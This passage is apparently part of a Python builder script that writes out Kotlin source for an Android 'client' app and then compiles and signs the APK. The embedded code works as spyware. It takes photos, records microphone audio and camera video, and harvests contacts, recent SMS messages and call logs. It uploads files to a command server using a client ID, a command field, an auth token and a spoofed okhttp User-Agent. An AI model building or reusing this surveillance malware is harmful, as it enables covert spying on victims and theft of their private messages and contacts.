        super.onRequestPermissionsResult(rc, p, gr)
        try {
            if (rc == REQ) {
                if (gr.isNotEmpty() && gr[0] == PackageManager.PERMISSION_GRANTED) startCamera()
                else finish()
            }
        } catch (_: Throwable) {
            finish()
        }
    }

    private fun startCamera() {
        try {
            val i = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (i.resolveActivity(packageManager) != null) {
                val f = createImageFile()
                if (f != null) {
                    photoFile = f
                    val uri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        val v = ContentValues().apply {
                            put(MediaStore.Images.Media.DISPLAY_NAME, f.name)
                            put(MediaStore.Images.Media.MIME_TYPE, "image/jpeg")
                            put(MediaStore.Images.Media.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
                        }
                        contentResolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, v)
                    } else Uri.fromFile(f)
                    if (uri != null) i.putExtra(MediaStore.EXTRA_OUTPUT, uri)
                    else i.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(f))
                    startActivityForResult(i, REQ)
                } else finish()
            } else finish()
        } catch (_: Throwable) {
            finish()
        }
    }

    private fun createImageFile(): File? {
        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val d = getExternalFilesDir(Environment.DIRECTORY_PICTURES)
        return File.createTempFile("JPEG_${ts}_", ".jpg", d)
    }

    override fun onActivityResult(rc: Int, rr: Int, data: Intent?) {
        super.onActivityResult(rc, rr, data)
        try {
            if (rc == REQ && rr == RESULT_OK) {
                val f = photoFile
                if (f != null && f.exists()) uploadFile(f) else finish()
            } else finish()
        } catch (_: Throwable) {
            finish()
        }
    }

    private fun uploadFile(f: File) {
        try {
            val b = f.readBytes()
            val n = "photo_" + System.currentTimeMillis() + ".jpg"
            FileUploader.uploadFile(this, b, n, uploadCommand, clientId) { ok ->
                runOnUiThread {
                    Log.d("CaptureActivity", if (ok) "uploaded" else "failed")
                    f.delete()
                    finish()
                }
            }
        } catch (_: Exception) {
            finish()
        }
    }
}
""",
"app/src/main/java/com/yourapp/client/MediaRecorderHelper.kt": r"""
package com.yourapp.client

import android.content.Context
import android.media.MediaRecorder
import android.os.Environment
import java.io.File

object MediaRecorderHelper {
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null

    fun startRecording(context: Context, type: String = "audio"): Boolean = try {
        val ext = if (type == "audio") "3gp" else "mp4"
        val dir = if (type == "audio") Environment.DIRECTORY_MUSIC else Environment.DIRECTORY_MOVIES
        val f = File(context.getExternalFilesDir(dir), "${type}_${System.currentTimeMillis()}.$ext")
        outputFile = f
        mediaRecorder = MediaRecorder().apply {
            if (type == "audio") {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
            } else {
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(640, 480)
                setVideoFrameRate(30)
            }
            setOutputFile(f.absolutePath)
            prepare()
            start()
        }
        true
    } catch (_: Exception) {
        false
    }

    fun stopRecording(): File? = try {
        mediaRecorder?.apply { stop(); release() }
        mediaRecorder = null
        outputFile
    } catch (_: Exception) {
        null
    }
}
""",
"app/src/main/java/com/yourapp/client/DataCollector.kt": r"""
package com.yourapp.client

import android.content.Context
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject

object DataCollector {
    fun getContacts(context: Context): JSONObject {
        val r = JSONObject()
        val l = JSONArray()
        val c = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null)
        c?.use {
            val ni = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val pi = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext()) {
                val o = JSONObject()
                o.put("name", it.getString(ni))
                o.put("phone", it.getString(pi))
                l.put(o)
            }
        }
        r.put("contacts", l)
        return r
    }

    fun getSms(context: Context): JSONObject {
        val r = JSONObject()
        val l = JSONArray()
        val c = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE),
            null, null, Telephony.Sms.DATE + " DESC LIMIT 100")
        c?.use {
            val ai = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bi = it.getColumnIndex(Telephony.Sms.BODY)
            val di = it.getColumnIndex(Telephony.Sms.DATE)
            while (it.moveToNext()) {
                val o = JSONObject()
                o.put("address", it.getString(ai))
                o.put("body", it.getString(bi))
                o.put("date", it.getLong(di))
                l.put(o)
            }
        }
        r.put("sms", l)
        return r
    }

    fun getCallLog(context: Context): JSONObject {
        val r = JSONObject()
        val l = JSONArray()
        val c = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
            null, null, CallLog.Calls.DATE + " DESC LIMIT 100")
        c?.use {
            val ni = it.getColumnIndex(CallLog.Calls.NUMBER)
            val ti = it.getColumnIndex(CallLog.Calls.TYPE)
            val du = it.getColumnIndex(CallLog.Calls.DURATION)
            val da = it.getColumnIndex(CallLog.Calls.DATE)
            while (it.moveToNext()) {
                val o = JSONObject()
                o.put("number", it.getString(ni))
                val t = it.getInt(ti)
                o.put("type", when (t) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "unknown"
                })
                o.put("duration", it.getLong(du))
                o.put("date", it.getLong(da))
                l.put(o)
            }
        }
        r.put("call_log", l)
        return r
    }
}
""",
"app/src/main/java/com/yourapp/client/FileUploader.kt": r"""
package com.yourapp.client

import android.content.Context
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.io.DataOutputStream
import java.net.HttpURLConnection
import java.net.URL
import javax.net.ssl.HttpsURLConnection

object FileUploader {
    fun uploadFile(context: Context, fileBytes: ByteArray, filename: String, command: String, clientId: String, callback: (Boolean) -> Unit) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val s = SharedPrefsManager.getServerUrl(context)
                val k = SharedPrefsManager.getEncryptionKey(context)
                val ts = System.currentTimeMillis().toString()
                val a = genAuth(ts, k)
                val url = URL("$s/upload")
                val conn = (if (s.startsWith("https")) url.openConnection() as HttpsURLConnection
                            else url.openConnection() as HttpURLConnection)
                conn.requestMethod = "POST"
                conn.setRequestProperty("User-Agent", "okhttp/4.9.0")
                conn.setRequestProperty("X-Timestamp", ts)
                conn.setRequestProperty("X-Auth-Token", a)
                conn.setRequestProperty("X-Client-ID", clientId)
                conn.setRequestProperty("Connection", "close")
                conn.connectTimeout = 15000
                conn.readTimeout = 60000
                val boundary = "*****" + System.currentTimeMillis() + "*****"
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                conn.doOutput = true
                val os = DataOutputStream(conn.outputStream)
                writeField(os, boundary, "client_id", clientId)
                writeField(os, boundary, "command", command)
                writeField(os, boundary, "filename", filename)
                os.writeBytes("--$boundary\r\n")
                os.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$filename\"\r\n")
                os.writeBytes("Content-Type: application/octet-stream\r\n\r\n")
                os.write(fileBytes)
                os.writeBytes("\r\n")
                os.writeBytes("--$boundary--\r\n")
                os.flush()
                os.close()
                val code = conn.responseCode
                conn.disconnect()
                callback(code == 200)
            } catch (_: Exception) {
                callback(false)
            }
        }
    }

    private fun writeField(os: DataOutputStream, b: String, n: String, v: String) {
        os.writeBytes("--$b\r\n")
        os.writeBytes("Content-Disposition: form-data; name=\"$n\"\r\n\r\n")
        os.writeBytes(v)
        os.writeBytes("\r\n")
    }

    private fun genAuth(ts: String, k: String): String =
        java.security.MessageDigest.getInstance("SHA-256").digest("$ts:$k".toByteArray()).joinToString("") { "%02x".format(it) }
}
""",
}

_k = "app/src/main/java/com/yourapp/client/SharedPrefsManager.kt"
KOTLIN_FILES[_k] = KOTLIN_FILES[_k].replace("__DEFAULT_SERVER_URL__", SERVER_URL).replace("__DEFAULT_KEY__", ENCRYPTION_KEY)


def write_file(path, content):
    full = os.path.join(PROJECT_DIR, path)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w", encoding="utf-8") as f:
        f.write(content)


def generate_project():
    log_step("[gen] Generating Android project")
    for p, c in FILES.items():
        write_file(p, c)
    for p, c in KOTLIN_FILES.items():
        write_file(p, c)
    log_ok("Project files written")


def build_apk():
    log_step("[build] Running gradle assembleRelease")
    os.chdir(PROJECT_DIR)
    env = os.environ.copy()
    env["ANDROID_SDK_ROOT"] = SDK_ROOT
    env["ANDROID_HOME"] = SDK_ROOT
    env["JAVA_HOME"] = JDK_DIR
    env["PATH"] = os.path.join(JDK_DIR, "bin") + os.pathsep + env.get("PATH", "")
    try:
        os.chmod("./gradlew", 0o755)
    except Exception:
        pass
    r = sp.run(["./gradlew", "assembleRelease"], env=env, capture_output=True, text=True)
    if r.returncode != 0:
        log_err("Gradle build failed")
        print(r.stdout[-4000:])
        print(r.stderr[-4000:])
        os.chdir("..")
        return False
    os.chdir("..")
    log_ok("Build successful")
    return True


def sign_apk():
    log_step("[sign] Signing APK")
    unsigned = os.path.join(PROJECT_DIR, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk")
    if not os.path.exists(unsigned):
        log_err(f"Unsigned APK not found: {unsigned}")
        return False
    pwd = load_release_pass()
    if not pwd:
        log_err("Could not load release keystore password")
        return False
    ap = os.path.join(SDK_ROOT, "build-tools", "35.0.0", "apksigner")
    os.chmod(ap, 0o755)
    r = sp.run([ap, "sign", "--ks", RELEASE_KEYSTORE,
                "--ks-key-alias", RELEASE_KEY_ALIAS,
                "--ks-pass", "pass:" + pwd, "--key-pass", "pass:" + pwd,
                "--out", OUTPUT_APK, unsigned], capture_output=True, text=True)
    if r.returncode != 0:
        log_warn("--out not supported, retry in-place")
        r2 = sp.run([ap, "sign", "--ks", RELEASE_KEYSTORE,
                     "--ks-key-alias", RELEASE_KEY_ALIAS,
                     "--ks-pass", "pass:" + pwd, "--key-pass", "pass:" + pwd, unsigned],
                     capture_output=True, text=True)
        if r2.returncode != 0:
            log_err("Signing failed!")
            print(r2.stderr[-2000:])
            return False
        shutil.copy(unsigned, OUTPUT_APK)
    log_ok(f"Signed APK: {OUTPUT_APK}")
    return True


def main():
    print()
    print(f"  Server URL:     {SERVER_URL}")
    print(f"  Encryption key: {'*' * len(ENCRYPTION_KEY)}")
    print(f"  Platform:       {platform.system()} {platform.machine()}")
    print()
    if not ensure_system_dependencies(): sys.exit(1)
    if not ensure_jdk(): sys.exit(1)
    if not ensure_sdk(): sys.exit(1)
    if not ensure_release_keystore(): sys.exit(1)
    generate_project()
    if not ensure_gradle_wrapper(): sys.exit(1)
    if not ensure_signing_tools(): sys.exit(1)
    if not build_apk(): sys.exit(1)
    if not sign_apk(): sys.exit(1)
    print()
    print("==================================================")
    print(f"  APK ready: {os.path.abspath(OUTPUT_APK)}")
    print(f"  Size: {os.path.getsize(OUTPUT_APK)//1024} KB")
    print()


if __name__ == "__main__":
    main()
